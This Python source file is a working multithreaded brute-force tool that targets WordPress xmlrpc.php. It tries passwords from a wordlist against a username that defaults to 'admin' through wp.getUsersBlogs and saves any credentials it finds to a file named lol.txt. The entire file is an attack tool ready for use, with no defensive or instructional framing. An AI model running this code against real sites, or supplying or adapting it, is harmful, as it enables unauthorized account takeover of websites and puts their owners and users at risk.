import xmlrpc.client
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import sys
import time
import socket

# --- Configuration ---
DEFAULT_USERNAME = "admin"  # Default username
DEFAULT_METHOD = "wp.getUsersBlogs" # Common WordPress method, adjust if needed
DEFAULT_THREADS = 50
DEFAULT_TIMEOUT = 10 # seconds for socket operations
OUTPUT_FILE = "lol.txt"

# --- Globals for thread communication ---
found_event = threading.Event()
found_password_global = None
tried_passwords_count = 0
total_passwords = 0
lock = threading.Lock()
# Store the method to try globally, so it can be set by args
METHOD_TO_TRY = DEFAULT_METHOD


def print_status(message):
    """Prints message to stderr to not interfere with potential stdout password"""
    sys.stderr.write(f"\r{message}")
    sys.stderr.flush()

def attempt_login(url, username, password, timeout, method_to_call_name):
    global found_password_global, tried_passwords_count

    if found_event.is_set():
        return None # Another thread already found the password

    try:
        # Create a new ServerProxy for each attempt.
        server = xmlrpc.client.ServerProxy(url, verbose=False)
        
        # Dynamically get the method
        method_to_call_actual = getattr(server, method_to_call_name)
        
        result = method_to_call_actual(username, password)

        # If we reach here without an exception, it's likely a success!
        with lock:
            if not found_event.is_set(): # Double check to ensure atomicity
                print_status("") # Clear status line
                success_message = f"\n[+] SUCCESS! Username: '{username}', Password: '{password}'"
                print(success_message)
                print(f"    URL: {url}")
                print(f"    Method: {method_to_call_name}, Result: {str(result)[:100]}...")
                
                found_password_global = password
                found_event.set() # Signal other threads and main loop

                # Save to lol.txt
                try:
                    with open(OUTPUT_FILE, "a", encoding="utf-8") as f_out:
                        f_out.write(f"URL: {url}\n")
                        f_out.write(f"Username: {username}\n")
                        f_out.write(f"Password: {password}\n")
                        f_out.write(f"Method: {method_to_call_name}\n")
                        f_out.write(f"Result (partial): {str(result)[:100]}...\n")
                        f_out.write("-" * 20 + "\n")
                    print(f"[*] Credentials saved to {OUTPUT_FILE}")
                except Exception as e_file:
                    print(f"[!] Error saving to {OUTPUT_FILE}: {e_file}")
                
        return password # Return the found password

    except xmlrpc.client.Fault as e:
        if e.faultCode == 403: # Incorrect username or password.
            pass
        else:
            # Suppress frequent "unknown method" or other XML-RPC errors unless verbose
            # print_status(f"[*] XML-RPC Fault for '{password}': {e.faultString} (Code: {e.faultCode})")
            pass
    except socket.timeout:
        print_status(f"[*] Timeout for '{password}' on {url}                                       ")
    except socket.error as e:
        print_status(f"[*] Socket error for '{password}' on {url}: {e}                             ")
    except AttributeError:
        # This can happen if the server doesn't support the method_to_call_name
        print_status(f"[*] Method '{method_to_call_name}' not found on server or other AttributeError for '{password}'.")
    except Exception as e:
        print_status(f"[*] General error for '{password}': {type(e).__name__} - {e}                ")
    finally:
        with lock:
            tried_passwords_count += 1
            if not found_event.is_set(): # Only update status if not found
                progress = (tried_passwords_count / total_passwords) * 100 if total_passwords > 0 else 0
                # Pad with spaces to ensure previous longer lines are overwritten
                status_msg = f"[*] Attempts: {tried_passwords_count}/{total_passwords} ({progress:.2f}%) | Testing: {password[:15]:<15}..."
                print_status(status_msg.ljust(80)) # Adjust ljust width as needed

    return None


def main():
    global total_passwords, found_password_global, METHOD_TO_TRY

    parser = argparse.ArgumentParser(description="XML-RPC Brute-Forcer. Saves found credential to lol.txt.")
    parser.add_argument("url", help="Target XML-RPC URL (e.g., http://target.com/xmlrpc.php)")
    parser.add_argument("password_file", help="File containing passwords, one per line (e.g., passwords.txt)")
    parser.add_argument("-u", "--username", default=DEFAULT_USERNAME, help=f"Username to brute-force (default: {DEFAULT_USERNAME})")
    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS, help=f"Number of concurrent threads (default: {DEFAULT_THREADS})")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help=f"Socket timeout in seconds (default: {DEFAULT_TIMEOUT})")
    parser.add_argument("-m", "--method", default=DEFAULT_METHOD, help=f"XML-RPC method to try for authentication (default: {DEFAULT_METHOD})")

    args = parser.parse_args()

    # Set the global socket timeout
    socket.setdefaulttimeout(args.timeout)
    
    # Set the method to try from arguments
    METHOD_TO_TRY = args.method

    print(f"[*] Target URL: {args.url}")
    print(f"[*] Username:   {args.username}")
    print(f"[*] Password File: {args.password_file}")
    print(f"[*] Threads:    {args.threads}")
    print(f"[*] Timeout:    {args.timeout}s")
    print(f"[*] Method:     {METHOD_TO_TRY}")
    print(f"[*] Output File: {OUTPUT_FILE}")
    print("-" * 30)

    try:
        with open(args.password_file, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
        if not passwords:
            print("[!] Password file is empty or contains no valid passwords.")
            return
        total_passwords = len(passwords)
        print(f"[*] Loaded {total_passwords} passwords.")
    except FileNotFoundError:
        print(f"[!] Error: Password file '{args.password_file}' not found.")
        return
    except Exception as e:
        print(f"[!] Error reading password file: {e}")
        return

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(attempt_login, args.url, args.username, pwd, args.timeout, METHOD_TO_TRY) for pwd in passwords]

        try:
            for future in as_completed(futures):
                if found_event.is_set():
                    # Password found by one of the tasks, try to cancel pending ones.
                    # Note: Tasks already running cannot be forcibly stopped by cancel(),
                    # but they will check found_event internally.
                    # Tasks not yet started might be cancelled.
                    for f_cancel in futures:
                        if not f_cancel.done():
                            f_cancel.cancel()
                    break # Exit the as_completed loop
                # result = future.result() # Process result if needed, but success is handled in attempt_login
        except KeyboardInterrupt:
            print_status("") # Clear status line
            print("\n[!] Ctrl+C detected. Shutting down threads...")
            found_event.set() # Signal all threads to stop
            # For Python 3.9+ you could use cancel_futures=True
            # executor.shutdown(wait=True, cancel_futures=True)
            executor.shutdown(wait=True) # Wait for running tasks to complete or react to found_event
            print("[!] Shutdown complete.")
            sys.exit(1)
        # Ensure all threads are given a chance to finish or be cancelled if password found
        # executor.shutdown(wait=True) # This happens implicitly when exiting 'with' block

    end_time = time.time()
    print_status("".ljust(80)) # Clear status line completely
    print("\n" + "-" * 30)

    if found_password_global:
        print(f"[+] Password found: '{found_password_global}' for username '{args.username}'")
        print(f"[*] Details saved to {OUTPUT_FILE}")
    else:
        print(f"[-] Password not found for username '{args.username}' in the list.")

    print(f"[*] Total time taken: {end_time - start_time:.2f} seconds.")
    print(f"[*] Total attempts made before stopping/completion: {tried_passwords_count}")

if __name__ == "__main__":
    main()
